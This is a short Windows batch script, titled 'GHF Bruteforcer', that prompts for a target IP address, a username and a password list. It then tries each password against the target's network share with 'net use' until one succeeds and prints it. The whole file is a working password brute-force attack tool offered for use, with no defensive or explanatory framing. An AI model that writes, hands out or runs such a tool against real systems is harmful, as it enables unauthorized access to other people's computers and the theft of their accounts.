@echo off
title GHF Bruteforcer - Created by Soulless
color A
echo.
set /p ip=Enter the target IPv4 address: 
set /p user=Enter the target username: 
set /p passlist=Enter a valid passlist (for mobile devices, use the one pre- installed with this bruteforcer by typing eos_pins.txt): 

set /a count=1
for /f %%a in (%passlist%) do (
  set pass=%%a
  call :attempt
)
echo Error 0x93568172a, contact support for more info. (ghf.soulless@gmail.com)
echo Press any key to exit GHF Bruteforcer.
pause >nul
exit

:success
echo.
echo Attack successul, the target's password is: %pass%
net use \\%ip% /d /y >nul 2>&1
echo Press any key to exit GHF Bruteforcer.
pause >nul
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
